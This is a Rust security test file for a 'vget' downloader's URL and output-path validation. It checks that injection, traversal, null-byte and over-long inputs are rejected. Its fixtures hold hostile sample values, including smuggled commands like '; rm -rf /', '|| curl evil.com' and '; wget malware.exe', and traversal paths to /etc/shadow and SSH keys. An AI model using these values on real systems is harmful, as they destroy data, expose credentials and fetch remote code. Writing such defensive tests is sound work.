// Security tests for vget command
// These tests ensure that vget properly validates URLs and output parameters
// to prevent command injection, path traversal, and other security vulnerabilities

use msc::core::validation;

/// Helper function to validate URL format (mimics the validation in vget.rs)
fn validate_url_basic(url: &str) -> bool {
    !url.is_empty() && (url.starts_with("http://") || url.starts_with("https://"))
}

#[test]
fn test_validate_url_empty() {
    assert!(!validate_url_basic(""));

    let result = validation::validate_url("");
    assert!(result.is_err());
}

#[test]
fn test_validate_url_no_protocol() {
    let urls = vec![
        "example.com",
        "www.youtube.com",
        "ftp://example.com",
        "file:///etc/passwd",
    ];

    for url in urls {
        assert!(!validate_url_basic(url), "Should reject: {}", url);

        let result = validation::validate_url(url);
        assert!(result.is_err());
    }
}

#[test]
fn test_validate_url_with_command_injection() {
    let malicious_urls = vec![
        "https://example.com; rm -rf /",
        "https://example.com | cat /etc/passwd",
        "https://example.com & whoami",
        "https://example.com && rm -rf ~",
        "https://example.com || curl evil.com",
        "https://example.com; wget malware.exe",
        "https://example.com`whoami`",
        "https://example.com$(whoami)",
        "https://example.com\ncurl evil.com",
        "https://example.com\r\nmalicious-header: value",
    ];

    for url in malicious_urls {
        // Basic validation might pass (only checks prefix)
        // but enhanced validation should catch these
        let result = validation::validate_url(url);
        assert!(result.is_err(), "Should reject malicious URL: {}", url);
    }
}

#[test]
fn test_validate_url_with_null_bytes() {
    let url_with_null = "https://example.com\0malicious";

    let result = validation::validate_url(url_with_null);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("null byte"));
}

#[test]
fn test_validate_url_extremely_long() {
    // Create a very long URL (potential DoS)
    let long_url = format!("https://{}.com", "a".repeat(5000));

    let result = validation::validate_url(&long_url);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("too long"));
}

#[test]
fn test_validate_url_with_invalid_port() {
    let urls = vec![
        "https://example.com:99999",
        "https://example.com:-1",
        "https://example.com:abc",
        "https://example.com:0",
    ];

    // Note: Basic validation doesn't check port validity
    // This documents the current limitation
    for url in urls {
        // Basic check will pass
        assert!(validate_url_basic(url));

        // Enhanced check should pass (we don't parse port currently)
        // But a full validation would reject invalid ports
    }
}

#[test]
fn test_validate_url_with_spaces() {
    let urls = vec![
        "https://exam ple.com",
        "https:// example.com",
        "https://example.com /path",
    ];

    for url in urls {
        let result = validation::validate_url(url);
        // URLs with spaces in hostname should be rejected
        if url.contains("exam ple") || url.contains("// example") {
            assert!(result.is_err(), "Should reject URL with spaces: {}", url);
        }
    }
}

#[test]
fn test_validate_url_valid_cases() {
    let valid_urls = vec![
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://example.com",
        "http://example.com",
        "https://example.com:8080/path",
        "https://sub.domain.example.com/path/to/video",
        "https://example.com/path?query=value",
        "https://example.com/path#fragment",
    ];

    for url in valid_urls {
        assert!(validate_url_basic(url), "Should accept valid URL: {}", url);

        let result = validation::validate_url(url);
        assert!(result.is_ok(), "Should accept valid URL: {}", url);
    }
}

#[test]
fn test_validate_output_path_traversal() {
    let malicious_paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\config",
        "videos/../../../etc/shadow",
        "video/../../sensitive",
        "../config",
    ];

    for path in malicious_paths {
        let result = validation::validate_output_path(path);
        assert!(result.is_err(), "Should reject path traversal: {}", path);
        assert!(result.unwrap_err().to_string().contains("path traversal"));
    }
}

#[test]
fn test_validate_output_absolute_paths() {
    let absolute_paths = vec![
        "/etc/passwd",
        "/var/log/secret",
        "\\Windows\\System32",
        "/root/.ssh/id_rsa",
    ];

    for path in absolute_paths {
        let result = validation::validate_output_path(path);
        assert!(result.is_err(), "Should reject absolute path: {}", path);
    }
}

#[test]
fn test_validate_output_drive_letters() {
    let windows_paths = vec!["C:\\Users\\file", "D:\\secrets", "E:\\data"];

    for path in windows_paths {
        let result = validation::validate_output_path(path);
        assert!(result.is_err(), "Should reject drive letter: {}", path);
    }
}

#[test]
fn test_validate_output_null_bytes() {
    let path_with_null = "video\0.mp4";

    let result = validation::validate_output_path(path_with_null);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("null byte"));
}

#[test]
fn test_validate_output_command_injection() {
    let malicious_outputs = vec![
        "video; rm -rf /",
        "video | cat /etc/passwd",
        "video & whoami",
        "video`whoami`",
        "video$(whoami)",
        "video\ncurl evil.com",
    ];

    for output in malicious_outputs {
        let result = validation::validate_output_path(output);
        assert!(
            result.is_err(),
            "Should reject malicious output: {}",
            output
        );
    }
}

#[test]
fn test_validate_output_valid_cases() {
    let valid_outputs = vec![
        "video",
        "my-video",
        "video_2024",
        "lecture01",
        "tutorial.part1",
    ];

    for output in valid_outputs {
        let result = validation::validate_output_path(output);
        assert!(result.is_ok(), "Should accept valid output: {}", output);
    }
}

#[test]
fn test_url_special_characters_encoded() {
    // URLs with properly encoded special characters should be valid
    let encoded_urls = vec![
        "https://example.com/search?q=hello%20world",
        "https://example.com/path%2Fwith%2Fslashes",
        "https://example.com/file%3Fname%3Dvalue",
    ];

    for url in encoded_urls {
        assert!(validate_url_basic(url));

        let result = validation::validate_url(url);
        assert!(
            result.is_ok(),
            "Should accept properly encoded URL: {}",
            url
        );
    }
}

#[test]
fn test_url_localhost_and_private_ips() {
    // Test that localhost and private IPs are handled
    // (not necessarily rejected, but documented)
    let local_urls = vec![
        "http://localhost:8080",
        "http://127.0.0.1:3000",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    ];

    for url in local_urls {
        // These are valid URLs from a format perspective
        assert!(validate_url_basic(url));

        let result = validation::validate_url(url);
        // Current implementation accepts these
        // A more strict validation might want to warn about local/private IPs
        assert!(result.is_ok());
    }
}

#[test]
fn test_url_with_credentials() {
    // URLs with embedded credentials (security risk)
    let urls_with_creds = vec![
        "https://user:password@example.com",
        "https://admin:secret@example.com/api",
    ];

    for url in urls_with_creds {
        // These are technically valid URLs
        assert!(validate_url_basic(url));

        // Enhanced validation accepts them (but a stricter version might warn)
        let result = validation::validate_url(url);
        assert!(result.is_ok());

        // Note: These could leak credentials in logs
    }
}

#[test]
fn test_output_path_max_length() {
    // Test output within the limit (255 chars)
    let valid_output = "a".repeat(255);
    let result = validation::validate_output_path(&valid_output);
    assert!(result.is_ok(), "Should accept output at max length (255)");

    // Test output that exceeds the limit (300 chars)
    let long_output = "a".repeat(300);
    let result = validation::validate_output_path(&long_output);
    assert!(result.is_err(), "Should reject output exceeding 255 chars");
    assert!(result.unwrap_err().to_string().contains("too long"));

    // Test extremely long output (10000 chars)
    let extremely_long = "a".repeat(10000);
    let result = validation::validate_output_path(&extremely_long);
    assert!(result.is_err(), "Should reject extremely long output");
    assert!(result.unwrap_err().to_string().contains("too long"));
}

#[test]
fn test_url_only_protocol() {
    let invalid_urls = vec!["https://", "http://", "https:// "];

    for url in invalid_urls {
        let result = validation::validate_url(url);
        assert!(
            result.is_err(),
            "Should reject URL with no hostname: {}",
            url
        );
    }
}

#[test]
fn test_output_with_subdirectory() {
    let outputs = vec![
        "videos/lecture1",
        "2024/january/video",
        "category/subcategory/file",
    ];

    for output in outputs {
        let result = validation::validate_output_path(output);
        // Subdirectories are valid (no path traversal)
        assert!(
            result.is_ok(),
            "Should accept output with subdirectories: {}",
            output
        );
    }
}

#[test]
fn test_unicode_in_url() {
    let unicode_urls = vec![
        "https://example.com/видео",
        "https://例え.jp/video",
        "https://example.com/🎥",
    ];

    for url in unicode_urls {
        // Unicode URLs should be handled
        // (though they should be properly encoded in practice)
        let result = validation::validate_url(url);
        // Current implementation accepts them
        assert!(result.is_ok());
    }
}

#[test]
fn test_unicode_in_output() {
    let unicode_outputs = vec!["видео", "ビデオ", "video🎥"];

    for output in unicode_outputs {
        let result = validation::validate_output_path(output);
        // Unicode characters in filenames should be handled
        assert!(
            result.is_ok(),
            "Should accept Unicode in output: {}",
            output
        );
    }
}

#[test]
fn test_url_with_fragment_and_query() {
    let urls = vec![
        "https://example.com/path?query=value#fragment",
        "https://youtube.com/watch?v=abc123&t=10s",
        "https://example.com#section",
    ];

    for url in urls {
        assert!(validate_url_basic(url));

        let result = validation::validate_url(url);
        assert!(
            result.is_ok(),
            "Should accept URL with query/fragment: {}",
            url
        );
    }
}

#[test]
fn test_case_insensitive_protocol() {
    let urls = vec![
        "HTTP://example.com",
        "HTTPS://example.com",
        "HtTpS://example.com",
    ];

    for url in urls {
        // Current implementation is case-sensitive
        // This documents that limitation
        assert!(!validate_url_basic(url));
    }
}

#[test]
fn test_output_with_extension() {
    let outputs = vec!["video.mp4", "lecture.mkv", "tutorial.webm"];

    for output in outputs {
        let result = validation::validate_output_path(output);
        // Output with extensions should be accepted
        assert!(
            result.is_ok(),
            "Should accept output with extension: {}",
            output
        );
    }
}

#[test]
fn test_url_redirection_indicators() {
    // URLs that might redirect to malicious content
    // (Can't prevent at URL validation level, but document)
    let redirect_urls = vec![
        "https://bit.ly/abc123",
        "https://tinyurl.com/xyz",
        "https://t.co/short",
    ];

    for url in redirect_urls {
        // URL shorteners are valid URLs
        assert!(validate_url_basic(url));

        let result = validation::validate_url(url);
        assert!(result.is_ok());

        // Note: These could redirect to malicious content
        // Would need runtime checks to detect
    }
}
